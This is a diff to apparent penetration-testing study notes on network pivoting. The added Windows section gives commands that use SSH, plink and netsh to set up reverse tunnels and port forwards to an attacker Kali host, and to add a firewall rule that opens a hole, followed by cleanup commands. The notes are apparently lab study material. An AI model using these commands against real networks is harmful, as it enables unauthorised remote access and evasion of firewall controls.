@@ -264,4 +264,21 @@ Using SSHUTTLE:
     
         socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
         sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
-    
+
+On Windows: 
+    With SSH it is the same. in cmd "where ssh.exe" and use as usual if its there:
+        ssh -N -R 9998 kali@192.168.118.4
+        fix proxychains after
+    Plink:
+
+            plink.exe -ssh -l shaleph -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.255
+    Netsh:
+        netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
+        Check if listening:
+            netstat -anp TCP | find "2222"
+            netsh interface portproxy show all
+        Make hole to to avoid firewall restriction:
+            netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
+        Delete the rule and port forward after done:
+            netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
+            netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
